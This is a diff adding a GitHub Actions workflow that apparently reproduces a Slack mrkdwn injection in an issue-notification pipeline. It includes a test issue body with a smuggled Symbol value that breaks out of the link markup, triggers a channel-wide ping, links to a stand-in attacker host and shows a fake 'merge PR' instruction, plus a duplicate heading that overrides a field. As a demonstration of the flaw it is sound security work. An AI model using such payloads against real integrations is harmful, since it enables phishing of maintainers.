@@ -1,0 +1,70 @@
+name: repro-slack-mrkdwn
+on:
+  workflow_dispatch:
+    inputs:
+      title:
+        description: attacker-controlled issue title
+        required: true
+
+permissions: {}
+
+jobs:
+  repro:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build the payload exactly like issue-slack-notify.yml does
+        env:
+          PAYLOAD: |
+            {
+              "text": ${{ toJSON(format('🆕 New request on customized-token-list — #{0} {1}', 12, inputs.title)) }},
+              "blocks": [
+                {
+                  "type": "header",
+                  "text": {
+                    "type": "plain_text",
+                    "text": "🆕 New request received",
+                    "emoji": true
+                  }
+                },
+                {
+                  "type": "section",
+                  "text": {
+                    "type": "mrkdwn",
+                    "text": ${{ toJSON(format('On *customized-token-list*: <{0}|#{1} — {2}>, submitted by `{3}` and ready for review.', 'https://github.com/lifinance/customized-token-list/issues/12', 12, inputs.title, 'attacker-login')) }}
+                  }
+                }
+              ]
+            }
+        run: |
+          printf '%s' "$PAYLOAD" > /tmp/payload.json
+          echo "=== payload bytes ==="
+          cat /tmp/payload.json
+          echo
+          echo "=== json validity / rendered mrkdwn ==="
+          python3 - <<'PY'
+          import json
+          d = json.load(open('/tmp/payload.json'))
+          print("valid JSON: yes")
+          print("mrkdwn ->", d['blocks'][1]['text']['text'])
+          print("fallback text ->", d['text'])
+          PY
+
+      - name: Field-override parser test (identical algorithm to target parse step)
+        run: |
+          node - <<'JS'
+          const issueBody = [
+            '### Partner / organization', '', 'Acme',
+            '### Chain ID', '', '56',
+            '### Justification', '', 'totally normal justification text',
+            '### Partner / organization', '', 'EVIL-ORG (injected)',
+            '### Symbol', '', 'X>, <!channel> <https://evil.example|LI.FI: merge PR #99 now',
+          ].join('\n');
+          const fields = {};
+          for (const section of issueBody.split(/^### /m).slice(1)) {
+            const nl = section.indexOf('\n');
+            if (nl === -1) continue;
+            fields[section.slice(0, nl).trim()] = section.slice(nl + 1).trim();
+          }
+          console.log('partner =', JSON.stringify(fields['Partner / organization']));
+          console.log('symbol  =', JSON.stringify(fields['Symbol']));
+          JS
